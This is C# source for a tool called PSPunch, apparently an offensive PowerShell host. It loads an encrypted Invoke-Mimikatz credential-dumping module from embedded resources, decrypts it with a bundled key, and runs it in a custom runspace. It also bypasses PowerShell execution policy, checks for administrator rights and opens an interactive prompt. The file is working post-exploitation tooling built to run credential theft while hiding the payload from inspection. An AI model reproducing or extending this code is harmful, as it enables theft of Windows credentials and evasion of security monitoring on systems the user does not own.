using System;
using System.Configuration;
using System.Management.Automation.Runspaces;
using PSPunch.CryptUtil;
using System.IO;
using System.Text;
using System.Reflection;
using PSPunch.PSPunchInput;

namespace PSPunch
{
    class Program
    {
        static PunchInput PSInit()
        {

            //Setup PS Host and runspace
            PunchInput punchInput = new PunchInput();
            punchInput.host = new PSPunchHost();
            Runspace runspace = RunspaceFactory.CreateRunspace(punchInput.host);
            runspace.Open();
            punchInput.runspace = runspace;

            //Decrypt modules
            Assembly assembly = Assembly.GetExecutingAssembly();
            Stream moduleStream = assembly.GetManifestResourceStream("PSPunch.Modules.invoke-mimikatz.ps1.enc");
            ImportModules(punchInput, moduleStream);
            
            // Setup Console stage 1
            string prompt = "PSPUNCH! #> ";
            Console.BackgroundColor = ConsoleColor.DarkBlue;
            Console.Clear();

            //Setup PS env
            punchInput.cmd = "set-executionpolicy bypass -Scope process -Force";
            Processing.PSExec(punchInput);
            punchInput.cmd = "function Test-Admin { $wid = [System.Security.Principal.WindowsIdentity]::GetCurrent(); $prp = New-Object System.Security.Principal.WindowsPrincipal($wid); $adm = [System.Security.Principal.WindowsBuiltInRole]::Administrator; $prp.IsInRole($adm);}; write-host 'Is Admin: '(test-admin)";
            punchInput = Processing.PSExec(punchInput);

            //Setup Console
            punchInput.loopPos = 0;
            punchInput.cmdComplete = false;
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(prompt);
            Console.ForegroundColor = ConsoleColor.Yellow;

            return punchInput;

        }
        static void DisplayOutput(PunchInput punchInput)
        {
            int consoleTopPos = Console.CursorTop;
            string prompt = "PSPUNCH! #> ";
            Console.WriteLine("\n" + punchInput.output);
            consoleTopPos = Console.CursorTop;
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(prompt);
            Console.ForegroundColor = ConsoleColor.Yellow;
        }
        static void ImportModules(PunchInput punchInput, Stream moduleStream)
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            StreamReader keyReader = new StreamReader(assembly.GetManifestResourceStream("PSPunch.Modules.key.txt"));
            string key = keyReader.ReadToEnd();
            MemoryStream decMem = FileTools.DecryptFile(moduleStream, key);
            punchInput.cmd = Encoding.Unicode.GetString(decMem.ToArray());
            Processing.PSExec(punchInput);
        }

        static void Main(string[] args)
        {
            string prompt = "PSPUNCH! #> ";
            PunchInput punchInput = PSInit();
            while (true)
            {
                punchInput.keyInfo = Console.ReadKey();
                punchInput = Processing.CommandProcessor(punchInput);
                int consoleTopPos = Console.CursorTop;
                Console.SetCursorPosition(prompt.Length, consoleTopPos);
                Console.Write(new string(' ', Console.WindowWidth));
                Console.SetCursorPosition(prompt.Length, consoleTopPos);
                Console.Write(punchInput.displayCmd);
            }
        }
    }
}